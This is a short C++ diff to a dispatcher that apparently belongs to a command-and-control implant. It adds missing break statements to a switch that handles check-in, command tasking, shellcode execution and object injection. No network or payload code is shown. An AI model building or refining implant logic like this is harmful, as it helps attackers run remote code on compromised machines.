@@ -217,10 +217,10 @@ namespace Dispatcher {
 
         __debugbreak();
         switch (Parser::UnpackDword(&parser)) {
-            case TypeCheckin:   Ctx->session.checkin = true;
-            case TypeTasking:   Memory::Execute::ExecuteCommand(parser);
-            case TypeExecute:   Memory::Execute::ExecuteShellcode(parser);
-            case TypeObject:    Injection::LoadObject(parser);
+            case TypeCheckin:   Ctx->session.checkin = true; break;
+            case TypeTasking:   Memory::Execute::ExecuteCommand(parser); break;
+            case TypeExecute:   Memory::Execute::ExecuteShellcode(parser); break;
+            case TypeObject:    Injection::LoadObject(parser); break;
 
             default:
                 break;
